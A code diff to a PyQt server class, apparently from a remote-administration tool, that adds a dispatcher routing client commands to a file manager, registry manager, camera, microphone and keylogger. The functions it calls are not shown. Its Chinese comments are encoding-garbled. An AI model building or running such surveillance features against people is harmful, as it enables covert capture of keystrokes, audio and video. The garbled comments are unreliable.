@@ -35,7 +35,7 @@ class Server(Ui_ServerMainWindow, QtWidgets.QMainWindow):
         client_port = 25566
         client_address = (client_host, client_port)
 
-        # ´´½¨Ò»¸öÊÂ¼şÑ­»·ÔËĞĞ·şÎñÆ÷
+        # ï¿½ï¿½ï¿½ï¿½Ò»ï¿½ï¿½ï¿½Â¼ï¿½Ñ­ï¿½ï¿½ï¿½ï¿½ï¿½Ğ·ï¿½ï¿½ï¿½ï¿½ï¿½
         asyncio.run_coroutine_threadsafe(self.start_server(client_address), self.loop)
         threading.Thread(target=self.run_event_loop, daemon=True).start()
 
@@ -68,7 +68,7 @@ class Server(Ui_ServerMainWindow, QtWidgets.QMainWindow):
     async def handle_client(self, reader, writer):
         addr = writer.get_extra_info('peername')
 
-        # Òì²½ÇëÇóÖ÷Ïß³ÌÈ·ÈÏÊÇ·ñ½ÓÊÜÁ¬½Ó
+        # ï¿½ì²½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ß³ï¿½È·ï¿½ï¿½ï¿½Ç·ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
         confirm = await self.ask_connection_permission(addr[0], addr[1])
         if confirm == QMessageBox.No:
             self.log_message(f"[*] Connection from {addr[0]}:{addr[1]} rejected")
@@ -78,17 +78,50 @@ class Server(Ui_ServerMainWindow, QtWidgets.QMainWindow):
 
         self.log_message(f"[*] Connection from {addr[0]}:{addr[1]} accepted")
 
-        # ¶ÁÈ¡¿Í»§¶Ë·¢ËÍµÄÊı¾İ
+        # ï¿½ï¿½È¡ï¿½Í»ï¿½ï¿½Ë·ï¿½ï¿½Íµï¿½ï¿½ï¿½ï¿½ï¿½
         self.log_message(f"[*] Waiting for operation from {addr[0]}:{addr[1]}...")
         operation = await reader.read(1024)
         if not operation:
-            self.log_message(f"[*] Blank operation \"{operation}\" received from {addr[0]}:{addr[1]}")
+            self.log_message(f"[*] Blank operation received from {addr[0]}:{addr[1]}")
             writer.close()
             await writer.wait_closed()
             return
 
-        # ´¦Àí²Ù×÷
-        await handle_operation(self, operation, writer, reader)
+        # è§£ç æ“ä½œå†…å®¹
+        operation_str = operation.decode('utf-8').strip()
+        
+        # æ ¹æ®æ“ä½œç±»å‹è°ƒç”¨ä¸åŒçš„å¤„ç†å‡½æ•°
+        if operation_str == "fileManager":
+            operation = "File manager opened"
+            writer.write(operation.encode())
+            await writer.drain()
+            await open_file_manager(self,writer,reader)
+        elif operation_str == "regManager":
+            operation = "Register manager opened"
+            writer.write(operation.encode())
+            await writer.drain()
+            await open_reg_manager(self,writer,reader)
+        elif operation_str == "openCamera":
+            operation = "Camera opened"
+            writer.write(operation.encode())
+            await writer.drain()
+            await open_camera(self,writer,reader)
+        elif operation_str == "openMicrophone":
+            operation = "Microphone opened"
+            writer.write(operation.encode())
+            await writer.drain()
+            await open_microphone(self,writer,reader)
+        elif operation_str == "keylogger":
+            operation = "Keylogger started"
+            writer.write(operation.encode())
+            await writer.drain()
+            await start_keylogger(self,writer,reader)
+        else:
+            self.log_message(f"[*] Unknown operation: {operation_str}")
+            writer.close()
+            await writer.wait_closed()
+            return
+
         self.log_message(f"[*] Connection with {addr[0]}:{addr[1]} closed")
 
     async def ask_connection_permission(self, host, port):
@@ -99,14 +132,14 @@ class Server(Ui_ServerMainWindow, QtWidgets.QMainWindow):
 
     @QtCore.pyqtSlot(str, int, object)
     def show_connection_request(self, host, port, future):
-        # Ê¹ÓÃ Qt µÄÊÂ¼ş»úÖÆ±ÜÃâ×èÈû
+        # Ê¹ï¿½ï¿½ Qt ï¿½ï¿½ï¿½Â¼ï¿½ï¿½ï¿½ï¿½Æ±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
         confirm = QMessageBox.question(
             self,
             "Connection Request",
             f"Accept connection from {host}:{port}?",
             QMessageBox.Yes | QMessageBox.No
         )
-        # Ê¹ÓÃ call_soon_threadsafe È·±£Ïß³Ì°²È«µØÉèÖÃ future µÄ½á¹û
+        # Ê¹ï¿½ï¿½ call_soon_threadsafe È·ï¿½ï¿½ï¿½ß³Ì°ï¿½È«ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ future ï¿½Ä½ï¿½ï¿½
         self.loop.call_soon_threadsafe(future.set_result, confirm)
 
     def closeEvent(self, event):
